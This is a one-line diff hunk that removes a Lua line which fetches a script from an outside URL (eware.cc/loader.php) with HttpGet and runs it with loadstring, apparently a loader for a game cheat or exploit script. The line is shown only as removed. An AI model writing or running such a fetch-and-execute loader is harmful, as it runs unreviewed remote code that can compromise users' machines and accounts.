@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://eware.cc/loader.php'))()
